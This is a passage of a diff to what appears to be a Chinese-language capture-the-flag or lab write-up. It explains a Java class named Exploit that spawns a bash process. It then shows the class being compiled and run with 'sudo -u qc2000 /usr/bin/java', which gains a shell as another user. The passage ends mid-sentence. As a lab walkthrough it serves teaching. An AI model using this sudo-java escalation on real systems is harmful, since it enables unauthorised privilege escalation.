@@ -501,5 +501,13 @@ public class Exploit {
 - `ProcessBuilder` ：Java 用来创建操作系统进程的类
 - `pb.inheritIO()` ：连接终端
 - `pb.start()`：真正启动这个 bash 进程，返回 `Process` 对象
-- waitFor()`
- 
+- `waitFor()`：让 Java 程序**暂停等待**，直到你退出 bash（输入 `exit`）
+我们直接编译运行就好了
+```bash
+mav1234@Pom:/tmp$ javac Exploit.java
+mav1234@Pom:/tmp$ ls
+Exploit.class       Exploit.java        hsperfdata_mav1234
+mav1234@Pom:/tmp$ sudo -u qc2000 /usr/bin/java -cp /tmp Exploit
+qc2000@Pom:/tmp$
+```
+ 因为是以`qc2000`yon
